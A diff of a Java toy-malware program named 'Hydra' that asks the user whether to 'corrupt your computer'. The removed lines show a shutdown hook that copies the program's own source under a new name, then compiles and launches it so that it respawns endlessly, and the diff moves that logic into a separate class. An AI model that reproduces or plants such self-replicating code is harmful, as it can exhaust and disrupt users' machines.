@@ -22,74 +22,7 @@ public class Main extends Thread {
         int choice = JOptionPane.showConfirmDialog(null, "Do you wish to corrupt your computer?", "Hydra", JOptionPane.YES_NO_OPTION);
         if(choice == JOptionPane.NO_OPTION) System.exit(0);
 
-        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
-        String processName = runtimeMXBean.getName().split("@")[0];
-
-        String fileDir = System.getProperty("user.dir") + "\\src";
-        File dir = new File(fileDir);
-
-        String hydraMonitorContent;
-        StringJoiner monitorJoiner = new StringJoiner(processName);
-        for(String str : readJavaFileContent(System.getProperty("user.dir") + "\\src\\HydraMonitor.java").split("process_name")) {
-            monitorJoiner.add(str);
-        }
-        hydraMonitorContent = monitorJoiner.toString();
-        // Add more shit if needed
-
-        String hydraMonitorFileName = "HydraMonitor.java";
-        String hydraMonitorFilePath = "C:\\" + hydraMonitorFileName;
-
-//        FileWriter hydraMonitorFile = new FileWriter(hydraMonitorFilePath);
-//        hydraMonitorFile.write(hydraMonitorContent);
-//        hydraMonitorFile.close();
-
-//        try {
-//            ProcessBuilder compilerProcessBuilder = new ProcessBuilder("javac", hydraMonitorFilePath);
-//            Process compilerProcess = compilerProcessBuilder.start();
-//            int exitCode = compilerProcess.waitFor();
-//
-//            if (exitCode == 0) {
-//                ProcessBuilder javaProcessBuilder = new ProcessBuilder("java", "-cp", hydraMonitorFilePath, "HydraMonitor");
-//                Process javaProcess = javaProcessBuilder.start();
-//            } else {
-//            }
-//        } catch (IOException | InterruptedException e) {
-//            throw new RuntimeException(e);
-//        }
-
-        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            int numOfFiles = Objects.requireNonNull(dir.listFiles()).length;
-            String fileContent;
-            try {
-                StringJoiner joiner = new StringJoiner("Hydra" + numOfFiles);
-                for(String str : readJavaFileContent(System.getProperty("user.dir") + "\\src\\Main.java").split("Main")) {
-                    joiner.add(str);
-                }
-                fileContent = joiner.toString();
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-            try {
-                FileWriter file = new FileWriter(fileDir + "\\Hydra" + numOfFiles + ".java");
-                file.write(fileContent);
-                file.close();
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-            try {
-                ProcessBuilder compilerProcessBuilder = new ProcessBuilder("javac", fileDir + "\\Hydra" + numOfFiles + ".java");
-                Process compilerProcess = compilerProcessBuilder.start();
-                int exitCode = compilerProcess.waitFor();
-
-                if (exitCode == 0) {
-                    ProcessBuilder javaProcessBuilder = new ProcessBuilder("java", "-cp", fileDir, "Hydra" + numOfFiles);
-                    Process javaProcess = javaProcessBuilder.start();
-                } else {
-                }
-            } catch (IOException | InterruptedException e) {
-                throw new RuntimeException(e);
-            }
-        }));
+        new ShutdownHook().start(System.getProperty("user.dir") + "\\src");
 
         new Main().start();
     }
@@ -155,9 +88,5 @@ public class Main extends Thread {
 
     }
 
-    public static String readJavaFileContent(String filepath) throws IOException {
-        Path path = Paths.get(filepath);
-        byte[] bytes = Files.readAllBytes(path);
-        return new String(bytes);
-    }
+
 }
